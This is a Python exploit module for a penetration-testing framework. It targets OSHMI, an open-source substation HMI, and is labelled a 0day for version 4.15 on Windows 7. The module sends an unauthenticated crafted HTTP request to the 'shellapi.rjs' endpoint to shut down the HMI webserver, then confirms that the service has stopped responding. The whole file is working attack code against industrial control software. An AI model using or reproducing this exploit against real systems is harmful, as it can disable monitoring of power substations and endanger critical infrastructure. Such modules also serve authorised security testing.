#!/usr/bin/env python

import urllib2
import json
import socket
import time
from collections import OrderedDict
from Sploit import Sploit


INFO = {}
INFO['NAME'] = "efs_OSHMI_remote_shutdown"
INFO['DESCRIPTION'] = "OSHMI remote shutdown"
INFO['VENDOR'] = "https://sourceforge.net/projects/oshmiopensubstationhmi/"
INFO["CVE Name"] = "0day"
INFO["DOWNLOAD_LINK"] = "https://sourceforge.net/projects/oshmiopensubstationhmi/"
INFO["LINKS"] = []
INFO['CHANGELOG'] = "7 Jun, 2018"
INFO['PATH'] = "General/"
INFO["NOTES"] = """
    Specially crafted HTTP request allows to shutdown webserver. Authentication is not required. 
Tested against OSHMI 4.15 on Windows 7 SP1 x64.
"""

# Must be in every module, to be set by framework
OPTIONS = OrderedDict()
OPTIONS["HOST"] = "192.168.1.103"
OPTIONS["PORT"] = 51909


class exploit(Sploit):
    def __init__(self, host="",
                 port=0, ssl=False,
                 logger=None):
        Sploit.__init__(self, logger=logger)
        self.name = INFO['NAME']

    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get("HOST", OPTIONS["HOST"])
        self.port = self.args.get("PORT", OPTIONS["PORT"])

    def make_url(self, path=''):
        url = "http://%s:%s/%s" % (self.host, self.port, path)
        return url

    def run(self):
        # Get options from gui
        self.args()
        self.log('[*] Sending shutdown request')
        url = self.make_url('htdocs/shellapi.rjs?Y')
        res = urllib2.urlopen(url).read()
        if 'error' in res and 'none' in res:
            self.log('[+] Request successfully executed')
        else:
            self.log('[-] Request execution failed')
        self.log('[*] Checking service')
        time.sleep(5)
        try:
            res = urllib2.urlopen(url, timeout=10)
        except socket.timeout as e:
            self.log('[+] Service not responds')
            self.finish(True)
        self.finish(False)


if __name__ == '__main__':
    """
    By now we only have the tool
    mode for exploit..
    Later we would have
    standalone mode also.
    """
    print "Running exploit %s .. " % INFO['NAME']
    e = exploit("192.168.0.1", 80)
    e.run()